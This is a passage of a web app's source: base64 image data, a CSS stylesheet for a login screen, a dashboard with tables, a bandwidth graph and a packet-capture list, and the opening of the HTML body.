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);
  background-size: cover;
  background-position: center 42%;
  animation: login-bg-drift 36s ease-in-out infinite alternate;
}
@keyframes login-bg-drift {
  0% { transform: scale(1) translate(0, 0); }
  100% { transform: scale(1.05) translate(-1%, -0.5%); }
}
.app-bg-scrim {
  position: absolute;
  inset: 0;
  background:
    radial-gradient(ellipse 900px 700px at 50% 50%, transparent 20%, rgba(1,18,54,0.55) 68%),
    linear-gradient(160deg, rgba(1,18,54,0.15) 0%, rgba(1,18,54,0.35) 60%, rgba(1,18,54,0.55) 100%);
}
@media (max-width: 768px) {
  .app-bg-photo { background-position: 56% 42%; }
}
.login-card {
  position: relative;
  z-index: 1;
  width: 90%;
  max-width: 380px;
  padding: 40px 32px;
  background: rgba(17, 24, 32, 0.55);
  backdrop-filter: blur(24px) saturate(160%);
  -webkit-backdrop-filter: blur(24px) saturate(160%);
  border: 1px solid rgba(255,255,255,0.12);
  border-radius: 24px;
  box-shadow: 0 8px 32px rgba(0,0,0,0.4), 0 1px 0 rgba(255,255,255,0.08) inset, inset 0 0 0 1px rgba(0,0,0,0.25);
  text-align: center;
  animation: login-card-in 0.5s cubic-bezier(0.16, 1, 0.3, 1);
}
@keyframes login-card-in {
  from { opacity: 0; transform: translateY(12px) scale(0.98); }
  to { opacity: 1; transform: translateY(0) scale(1); }
}
.login-logo {
  display: block;
  height: 128px;
  width: auto;
  margin: 0 auto 16px;
  object-fit: contain;
  filter: drop-shadow(0 4px 16px rgba(84,180,236,0.45));
}
.login-title {
  font-size: 1.6rem;
  font-weight: 600;
  letter-spacing: -0.02em;
  margin-bottom: 2px;
}
.login-subtitle {
  color: var(--text-secondary);
  font-size: 0.85rem;
  margin-bottom: 28px;
}
.login-field { margin-bottom: 14px; }
.login-field input {
  width: 100%;
  background: rgba(255,255,255,0.06);
  border: 1px solid rgba(255,255,255,0.12);
  color: var(--text-primary);
  border-radius: 12px;
  padding: 14px 16px;
  font-size: 1rem;
  font-family: inherit;
  transition: border 0.2s, box-shadow 0.2s, background 0.2s;
}
.login-field input::placeholder { color: var(--text-disabled); }
.login-field input:focus {
  outline: none;
  border-color: var(--accent-primary);
  background: rgba(255,255,255,0.09);
  box-shadow: 0 0 0 4px rgba(84,180,236,0.15);
}
.login-btn {
  position: relative;
  overflow: hidden;
  width: 100%;
  background: linear-gradient(135deg, var(--accent-secondary), var(--accent-primary));
  color: #04121C;
  border: none;
  border-radius: 12px;
  padding: 14px;
  font-size: 1rem;
  font-weight: 600;
  font-family: inherit;
  cursor: pointer;
  margin-top: 6px;
  box-shadow: 0 4px 14px rgba(84,180,236,0.3);
  transition: transform 0.15s, box-shadow 0.15s;
}
.login-btn:hover { transform: translateY(-1px); box-shadow: 0 6px 18px rgba(84,180,236,0.4); }
.login-btn:active { transform: translateY(0) scale(0.98); }
.login-btn:disabled { opacity: 0.6; cursor: not-allowed; }
.login-ripple {
  position: absolute;
  border-radius: 50%;
  background: rgba(255,255,255,0.5);
  transform: scale(0);
  animation: login-ripple-anim 0.6s ease-out;
  pointer-events: none;
}
@keyframes login-ripple-anim {
  to { transform: scale(3); opacity: 0; }
}
.login-error {
  margin-top: 14px;
  padding: 10px 14px;
  background: var(--glow-danger);
  border: 1px solid rgba(148,35,41,0.3);
  color: var(--danger);
  border-radius: 10px;
  font-size: 0.85rem;
}
@media (prefers-reduced-motion: reduce) {
  .app-bg-photo, .login-card { animation: none; }
}
header {
  background: var(--bg-elevated);
  backdrop-filter: var(--glass-blur);
  -webkit-backdrop-filter: var(--glass-blur);
  border-bottom: 1px solid var(--border-subtle);
  padding: 12px 16px;
  display: flex;
  align-items: center;
  gap: 12px;
  position: sticky;
  top: 0;
  z-index: 100;
  box-shadow: inset 0 0 0 1px rgba(0,0,0,0.25);
}
.logo {
  display: flex;
  align-items: center;
  gap: 10px;
  font-weight: 700;
  font-size: 1.2rem;
  color: var(--text-primary);
  text-decoration: none;
}
.logo-icon {
  display: block;
  height: 72px;
  width: auto;
  object-fit: contain;
  filter: drop-shadow(0 2px 6px rgba(84,180,236,0.4));
}
.status-indicator {
  margin-left: auto;
  display: flex;
  align-items: center;
  gap: 8px;
  font-size: 0.9rem;
}
.status-dot {
  width: 10px;
  height: 10px;
  border-radius: 50%;
  background: var(--success);
  box-shadow: 0 0 8px var(--success);
}
.status-dot.running {
  background: var(--danger);
  box-shadow: 0 0 8px var(--danger);
  animation: pulse 1.5s infinite;
}
@keyframes pulse {
  0% { opacity: 1; }
  50% { opacity: 0.3; }
  100% { opacity: 1; }
}
.spinner {
  display: inline-block;
  width: 16px;
  height: 16px;
  border: 2px solid var(--border-strong);
  border-top-color: var(--accent-primary);
  border-radius: 50%;
  animation: spin 0.7s linear infinite;
  vertical-align: -3px;
}
@keyframes spin {
  to { transform: rotate(360deg); }
}
nav {
  background: var(--bg-elevated);
  backdrop-filter: var(--glass-blur);
  -webkit-backdrop-filter: var(--glass-blur);
  border-bottom: 1px solid var(--border-subtle);
  display: flex;
  overflow-x: auto;
  -webkit-overflow-scrolling: touch;
  padding: 0 8px;
  box-shadow: inset 0 0 0 1px rgba(0,0,0,0.25);
}
nav button {
  background: none;
  border: none;
  color: var(--text-secondary);
  padding: 14px 16px;
  font-size: 0.9rem;
  cursor: pointer;
  white-space: nowrap;
  display: flex;
  align-items: center;
  gap: 6px;
  border-bottom: 3px solid transparent;
  transition: all 0.2s;
}
nav button.active {
  color: var(--accent-primary);
  border-bottom-color: var(--accent-primary);
}
nav button .icon {
  font-size: 1.2rem;
}
main {
  flex: 1;
  padding: 16px;
  max-width: 1200px;
  width: 100%;
  margin: 0 auto;
}
.tab-content {
  display: none;
}
.tab-content.active {
  display: block;
}
.card {
  background: var(--bg-elevated);
  backdrop-filter: var(--glass-blur);
  -webkit-backdrop-filter: var(--glass-blur);
  border: 1px solid var(--border-subtle);
  border-radius: var(--radius);
  padding: 20px;
  margin-bottom: 16px;
  box-shadow: var(--shadow), inset 0 0 0 1px rgba(0,0,0,0.25);
}
.card h2 {
  font-size: 1.2rem;
  margin-bottom: 4px;
  display: flex;
  align-items: center;
  gap: 8px;
}
.card .sub {
  color: var(--text-secondary);
  font-size: 0.85rem;
  margin-bottom: 16px;
}
.row {
  display: flex;
  gap: 10px;
  flex-wrap: wrap;
  margin-bottom: 12px;
  align-items: center;
}
input, select, textarea {
  background: var(--bg-inset);
  border: 1px solid var(--border-subtle);
  color: var(--text-primary);
  border-radius: 8px;
  padding: 12px 14px;
  font-size: 1rem;
  font-family: inherit;
  transition: border 0.2s, box-shadow 0.2s;
}
input:focus, select:focus, textarea:focus {
  outline: none;
  border-color: var(--accent-primary);
  box-shadow: 0 0 0 3px var(--glow-accent);
}
input[type="text"], input[type="number"] { flex: 1; min-width: 120px; }
textarea { width: 100%; min-height: 80px; font-family: 'JetBrains Mono', monospace; font-size: 0.85rem; }
.btn {
  background: linear-gradient(135deg, var(--accent-secondary), var(--accent-primary));
  color: #04121C;
  border: none;
  border-radius: 8px;
  padding: 12px 20px;
  font-size: 1rem;
  font-weight: 600;
  cursor: pointer;
  transition: all 0.2s;
  min-height: 44px;
  box-shadow: 0 4px 14px rgba(84,180,236,0.3);
}
.btn:hover { transform: translateY(-1px); box-shadow: 0 6px 18px rgba(84,180,236,0.4); }
.btn:active { transform: scale(0.98); }
.btn:disabled { opacity: 0.5; cursor: not-allowed; }
.btn.secondary {
  background: transparent;
  border: 1px solid var(--border-strong);
  color: var(--text-primary);
}
.btn.secondary:hover { background: var(--bg-inset); }
.btn.danger {
  background: var(--danger);
  color: #1A0A0A;
}
.btn.big {
  font-size: 1.1rem;
  padding: 14px 28px;
}
.weapon-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
  gap: 10px;
  margin: 16px 0;
}
.weapon-btn {
  background: var(--bg-inset);
  border: 2px solid var(--border-subtle);
  border-radius: var(--radius);
  padding: 16px;
  text-align: center;
  cursor: pointer;
  transition: all 0.2s;
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 6px;
}
.weapon-btn:hover { border-color: var(--border-strong); }
.weapon-btn.active {
  border-color: var(--accent-primary);
  box-shadow: 0 0 0 2px var(--glow-accent);
}
.weapon-btn .num {
  font-size: 1.8rem;
  font-weight: 700;
  color: var(--accent-tertiary);
}
.weapon-btn .label {
  font-size: 0.8rem;
  color: var(--text-secondary);
}
.status-message {
  background: var(--bg-inset);
  border-radius: 8px;
  padding: 12px 16px;
  border-left: 4px solid var(--accent-primary);
  margin: 12px 0;
  font-size: 0.9rem;
}
.status-message.success { border-left-color: var(--success); }
.status-message.error { border-left-color: var(--danger); }
.table-responsive {
  overflow-x: auto;
  -webkit-overflow-scrolling: touch;
}
table {
  width: 100%;
  border-collapse: collapse;
  font-size: 0.9rem;
}
th {
  text-align: left;
  color: var(--text-secondary);
  font-weight: 500;
  font-size: 0.75rem;
  text-transform: uppercase;
  letter-spacing: 0.04em;
  padding: 12px 10px;
  border-bottom: 1px solid var(--border-subtle);
}
td {
  padding: 12px 10px;
  border-bottom: 1px solid var(--border-subtle);
}
tr:hover td { background: rgba(255,255,255,0.02); }
.badge {
  display: inline-flex;
  align-items: center;
  gap: 4px;
  padding: 4px 10px;
  border-radius: 20px;
  font-size: 0.7rem;
  font-weight: 600;
}
.badge.success { background: var(--glow-success); color: var(--success); }
.badge.warning { background: rgba(187,139,90,0.15); color: var(--warning); }
.badge.danger { background: var(--glow-danger); color: var(--danger); }
.badge.info { background: rgba(129,140,248,0.15); color: var(--info); }
.empty {
  color: var(--text-secondary);
  padding: 24px 0;
  text-align: center;
  font-size: 0.9rem;
}
.empty-inline {
  color: var(--text-secondary);
  font-size: 0.85rem;
}
.chip-row {
  display: flex;
  flex-wrap: wrap;
  gap: 8px;
  margin: 4px 0 20px;
}
.chip {
  display: inline-flex;
  align-items: center;
  gap: 4px;
  background: var(--bg-inset);
  border: 1px solid var(--border-subtle);
  border-radius: 20px;
  padding: 5px 6px 5px 12px;
  font-size: 0.85rem;
}
.chip-ip {
  color: var(--text-primary);
  font-family: 'JetBrains Mono', monospace;
  margin-right: 2px;
}
.chip-action {
  background: none;
  border: none;
  color: var(--text-secondary);
  cursor: pointer;
  padding: 5px;
  border-radius: 50%;
  display: inline-flex;
  align-items: center;
  justify-content: center;
}
.chip-action:hover { background: var(--glow-accent); color: var(--accent-primary); }

/* Packet Capture List (Compact Grid-based) */
#packet-capture-container { margin: 0; padding: 0; }
.packet-toolbar { margin-bottom: 12px; }
#packetList {
  display: flex;
  flex-direction: column;
  font-family: 'JetBrains Mono', 'Courier New', monospace;
  font-size: 13px;
  line-height: 1.4;
}
.packet-row {
  display: grid;
  grid-template-columns: 40px 80px 1fr 1fr 50px 50px 1.5fr;
  gap: 6px;
  padding: 6px 10px;
  border-bottom: 1px solid rgba(255,255,255,0.08);
  align-items: center;
  cursor: pointer;
  transition: background 0.1s;
  min-height: 36px;
}
.packet-row:nth-child(even) { background: rgba(255,255,255,0.02); }
.packet-row:hover { background: rgba(84,180,236,0.12); }
.packet-row.expanded { background: rgba(84,180,236,0.2); border-bottom: 0; }
.packet-row .expand-icon {
  display: inline-block;
  width: 16px;
  height: 16px;
  transform: rotate(0deg);
  transition: transform 0.2s;
  text-align: center;
  color: var(--text-secondary);
  font-size: 12px;
}
.packet-row.expanded .expand-icon { transform: rotate(90deg); }
.packet-row .time { color: var(--text-secondary); font-size: 12px; }
.packet-row .addr { color: var(--accent-tertiary); font-size: 12px; }
.packet-row .proto {
  display: inline-block;
  padding: 2px 6px;
  border-radius: 3px;
  font-size: 11px;
  font-weight: 600;
  color: #000;
}
.packet-row .proto.tcp { background: var(--info); }
.packet-row .proto.udp { background: var(--success); }
.packet-row .proto.icmp { background: var(--warning); }
.packet-row .len { color: var(--text-secondary); text-align: right; font-size: 11px; }
.packet-row .summary {
  color: var(--text-primary);
  font-size: 12px;
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
}
.packet-detail {
  display: none;
  grid-column: 1 / -1;
  padding: 12px;
  background: rgba(0,0,0,0.3);
  border-top: 1px solid rgba(255,255,255,0.08);
  border-bottom: 1px solid rgba(255,255,255,0.08);
  font-size: 11px;
  white-space: pre-wrap;
  word-break: break-all;
  max-height: 300px;
  overflow-y: auto;
  color: var(--text-secondary);
  line-height: 1.3;
}
.packet-row.expanded .packet-detail { display: block; }
.packet-detail-header { color: var(--accent-primary); font-weight: 600; margin-bottom: 8px; }
.hexdump {
  margin-top: 8px;
  padding: 8px;
  background: rgba(0,0,0,0.5);
  border-radius: 4px;
  border: 1px solid rgba(255,255,255,0.08);
  color: var(--accent-tertiary);
  overflow-x: auto;
}
@media (max-width: 768px) {
  .packet-row {
    grid-template-columns: 30px 70px 1fr 1fr 40px 40px 1fr;
    font-size: 11px;
    padding: 4px 8px;
    min-height: 32px;
    gap: 4px;
  }
  .packet-row .addr { font-size: 11px; }
  .packet-row .summary { font-size: 11px; }
  .packet-detail { font-size: 10px; padding: 8px; }
}

.btn-icon {
  background: none;
  border: none;
  color: var(--text-secondary);
  cursor: pointer;
  padding: 8px;
  border-radius: 6px;
  font-size: 1.1rem;
  min-width: 40px;
  min-height: 40px;
}
.btn-icon:hover { background: var(--glow-accent); color: var(--accent-primary); }
.btn-icon svg { vertical-align: middle; }
nav button .icon svg { display: block; }
.log-container {
  background: var(--bg-inset);
  border: 1px solid var(--border-subtle);
  border-radius: 8px;
  padding: 12px;
  max-height: 300px;
  overflow-y: auto;
  font-family: 'JetBrains Mono', monospace;
  font-size: 0.8rem;
}
.log-entry { padding: 4px 0; border-bottom: 1px solid rgba(255,255,255,0.03); display: flex; gap: 10px; }
.log-entry .time { color: var(--text-secondary); }
.log-entry .msg { flex: 1; }
.log-entry.error .msg { color: var(--danger); }
.log-entry.success .msg { color: var(--success); }
.log-entry.warn .msg { color: var(--warning); }
.modal-overlay {
  position: fixed;
  top: 0; left: 0; right: 0; bottom: 0;
  background: rgba(1,18,54,0.6);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 1000;
  backdrop-filter: blur(6px);
  box-shadow: inset 0 0 0 1px rgba(0,0,0,0.15);
}
.modal {
  background: var(--bg-elevated);
  backdrop-filter: var(--glass-blur);
  -webkit-backdrop-filter: var(--glass-blur);
  border-radius: var(--radius);
  padding: 24px;
  max-width: 400px;
  width: 90%;
  border: 1px solid var(--border-strong);
  box-shadow: var(--shadow), inset 0 0 0 1px rgba(0,0,0,0.25);
}
.modal h3 { margin-bottom: 12px; }
.modal p { color: var(--text-secondary); margin-bottom: 20px; }
.modal.wide { max-width: 640px; max-height: 80vh; overflow-y: auto; }
.bw-legend {
  display: flex;
  gap: 24px;
  flex-wrap: wrap;
  margin-bottom: 12px;
  font-size: 0.9rem;
}
.bw-key {
  display: flex;
  align-items: center;
  gap: 6px;
  color: var(--text-secondary);
}
.bw-key strong {
  color: var(--text-primary);
  font-family: 'JetBrains Mono', monospace;
  font-weight: 600;
  margin-left: 2px;
}
.bw-swatch {
  width: 10px;
  height: 10px;
  border-radius: 50%;
  display: inline-block;
}
.bw-swatch.dash { border-radius: 2px; }
.sparkline {
  width: 100%;
  height: 56px;
  display: block;
  background: var(--bg-inset);
  border: 1px solid var(--border-subtle);
  border-radius: 8px;
}
.sparkline polyline {
  fill: none;
  stroke-width: 2;
  stroke-linecap: round;
  stroke-linejoin: round;
}
#bw-spark-rx { stroke: var(--accent-primary); }
#bw-spark-tx { stroke: var(--warning); stroke-dasharray: 5 4; }
.stat-row {
  display: flex;
  gap: 10px;
  flex-wrap: wrap;
  margin-bottom: 16px;
}
.stat-tile {
  flex: 1 1 120px;
  background: var(--bg-inset);
  border: 1px solid var(--border-subtle);
  border-radius: 8px;
  padding: 12px 16px;
  display: flex;
  flex-direction: column;
  gap: 4px;
}
.stat-tile .stat-value {
  font-size: 1.4rem;
  font-weight: 700;
  color: var(--text-primary);
  font-family: 'JetBrains Mono', monospace;
}
.stat-tile .stat-label {
  font-size: 0.75rem;
  color: var(--text-secondary);
  text-transform: uppercase;
  letter-spacing: 0.04em;
}
#traffic-spark-line { stroke: var(--accent-primary); }
.toast-container {
  position: fixed;
  top: 20px;
  right: 20px;
  z-index: 2000;
  display: flex;
  flex-direction: column;
  gap: 10px;
}
.toast {
  background: var(--bg-elevated);
  backdrop-filter: var(--glass-blur);
  -webkit-backdrop-filter: var(--glass-blur);
  border: 1px solid var(--border-strong);
  border-radius: 8px;
  padding: 12px 16px;
  display: flex;
  align-items: center;
  gap: 10px;
  box-shadow: var(--shadow), inset 0 0 0 1px rgba(0,0,0,0.25);
  animation: slideIn 0.3s;
}
.toast.success { border-left: 4px solid var(--success); }
.toast.error { border-left: 4px solid var(--danger); }
.toast.warning { border-left: 4px solid var(--warning); }
@keyframes slideIn {
  from { transform: translateX(100%); opacity: 0; }
  to { transform: translateX(0); opacity: 1; }
}
@media (max-width: 768px) {
  nav {
    position: fixed;
    bottom: 0;
    left: 0;
    right: 0;
    top: auto;
    border-top: 1px solid var(--border-subtle);
    border-bottom: none;
    display: flex;
    justify-content: space-around;
    z-index: 100;
  }
  nav button {
    flex-direction: column;
    padding: 8px 4px;
    font-size: 0.7rem;
    border-bottom: none;
    border-top: 3px solid transparent;
    flex: 1;
  }
  nav button.active {
    border-top-color: var(--accent-primary);
    border-bottom: none;
  }
  main { padding-bottom: 80px; }
  .table-responsive {
    overflow-x: visible;
  }
  table, thead, tbody, th, td, tr {
    display: block;
  }
  thead tr { display: none; }
  tr {
    margin-bottom: 12px;
    border: 1px solid var(--border-subtle);
    border-radius: 8px;
    padding: 10px;
    background: var(--bg-elevated);
  }
  td {
    display: flex;
    justify-content: space-between;
    align-items: center;
    border-bottom: 1px solid rgba(255,255,255,0.05);
    padding: 8px 0;
  }
  td:last-child { border-bottom: none; }
  td::before {
    content: attr(data-label);
    font-weight: 600;
    color: var(--text-secondary);
    font-size: 0.7rem;
    text-transform: uppercase;
    letter-spacing: 0.04em;
    margin-right: 10px;
  }
}
</style>
</head>
<body>
<div class="app-bg">
  <div class="app-bg-photo"></div>
  <div class="app-bg-scrim"></div>
</div>
<div id="login-screen" class="login-screen" style="display:none;">
  <div class="login-card">
    <img class="login-logo" src="data:image/png;base64,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